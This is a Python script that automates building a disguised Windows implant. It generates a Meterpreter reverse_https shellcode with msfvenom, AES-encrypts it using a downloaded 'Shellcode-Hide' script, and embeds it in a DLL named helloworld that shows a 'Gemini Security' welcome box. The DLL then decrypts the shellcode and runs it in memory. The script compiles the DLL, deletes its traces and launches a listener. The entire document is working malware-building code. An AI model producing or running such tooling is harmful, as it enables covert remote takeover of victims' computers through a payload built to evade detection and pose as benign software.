import subprocess
import re

# Download AES.cpp using wget
wget_command = "wget -O aes.py https://raw.githubusercontent.com/TheD1rkMtr/Shellcode-Hide/main/3%20-%20Encrypting/1%20-%20AES/AES_cryptor.py"
subprocess.run(wget_command, shell=True)

# Modify aes.py file
with open('aes.py', 'r') as file:
    content = file.read()

# Replace key and payload variable declarations
content = re.sub(r'char AESkey\[\]', r'unsigned char AESkey[]', content)
content = re.sub(r'unsigned char AESshellcode\[\]', r'unsigned char payload[]', content)

# Save the modified aes.py file
with open('aes.py', 'w') as file:
    file.write(content)

# Get IP + PORT
ip = input("Enter the IP: ")
port = input("Enter the PORT: ")


# Generate OpenSSL certificate
openssl_cmd = 'openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 ' \
              '-subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" ' \
              '-keyout www.example.com.key ' \
              '-out www.example.com.crt && ' \
              'cat www.example.com.key www.example.com.crt > www.example.com.pem && ' \
              'rm -f www.example.com.key www.example.com.crt'

try:
    subprocess.run(openssl_cmd, shell=True, check=True)
    print("OpenSSL certificate generated.")
except subprocess.CalledProcessError as e:
    print(f"Error generating OpenSSL certificate: {e}")

# Create msfconfig.rc
msfconfig_content = f'''
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST {ip}
set LPORT {port}
set StagerVerifySSLCert true
set HandlerSSLCert www.example.com.pem
run
'''

with open('msfconfig.rc', 'w') as file:
    file.write(msfconfig_content)

print("msfconfig.rc created.")

# Generate the beacon.bin payload using msfvenom
payload_file = 'beacon.bin'
payload_command = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT={port} HandlerSSLCert=www.example.com.pem StagerVerifySSLCert=true -f raw -o {payload_file}"
subprocess.run(payload_command, shell=True)


# Execute aes.py with arguments
aes_command = "python3 aes.py beacon.bin > aes.txt"
subprocess.run(aes_command, shell=True, check=True)

# Open aes.txt file for reading
with open('aes.txt', 'r') as file:
    content = file.read()

# Extract AES key and payload from aes.txt content
lines = content.strip().split('\n')
aes_key = lines[0].strip()
payload = lines[1].strip()

# Create the C++ code template
cpp_code = f'''
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {{
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
        printf("Failed in CryptAcquireContextW (%%u)\\n", GetLastError());
        return;
    }}
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
        printf("Failed in CryptCreateHash (%%u)\\n", GetLastError());
        return;
    }}
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {{
        printf("Failed in CryptHashData (%%u)\\n", GetLastError());
        return;
    }}
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {{
        printf("Failed in CryptDeriveKey (%%u)\\n", GetLastError());
        return;
    }}

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {{
        printf("Failed in CryptDecrypt (%%u)\\n", GetLastError());
        return;
    }}

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
        case DLL_PROCESS_ATTACH:
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }}
    return TRUE;
}}

extern "C" {{
    __declspec(dllexport) BOOL WINAPI HelloWorld(void) {{
        MessageBox(NULL, "Welcome!", "Gemini Security", MB_OK);

        {aes_key}
        {payload}

        DWORD payload_length = sizeof(payload);

        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!alloc_mem) {{
            printf("Failed to Allocate memory (%%u)\\n", GetLastError());
            return -1;
        }}

        DecryptAES((char*)payload, payload_length, (char*)AESkey, sizeof(AESkey));
        MoveMemory(alloc_mem, payload, sizeof(payload));

        DWORD oldProtect;
        if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {{
            printf("Failed to change memory protection (%%u)\\n", GetLastError());
            return -2;
        }}

        HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
        if (!tHandle) {{
            printf("Failed to Create the thread (%%u)\\n", GetLastError());
            return -3;
        }}

        printf("\\n\\nalloc_mem: %%p\\n", alloc_mem);
        WaitForSingleObject(tHandle, INFINITE);
        getchar();

        return 0;
        return TRUE;
    }}
}}
'''

# Replace placeholders in the C++ code template with the actual AES key and payload
cpp_code = cpp_code.replace('{aes_key}', aes_key)
cpp_code = cpp_code.replace('{payload}', payload)

# Save the C++ code to a file
cpp_code_file = "helloworld.cpp"
with open(cpp_code_file, "w") as file:
    file.write(cpp_code)

# Compile
c = "x86_64-w64-mingw32-g++ -shared -o helloworld.dll helloworld.cpp -fpermissive"
subprocess.run(c, shell=True, check=True)

# Remove Process File
remove = "rm -r aes.py aes.txt beacon.bin helloworld.cpp"
subprocess.run(remove, shell=True, check=True)

print("The helloworld.dll file has been generated.")


# Execute msfconsole with the resource file
msfconsole_cmd = f'msfconsole -q -r msfconfig.rc'

try:
    subprocess.run(msfconsole_cmd, shell=True, check=True)
    print("msfconsole execution completed.")
except subprocess.CalledProcessError as e:
    print(f"Error executing msfconsole: {e}")
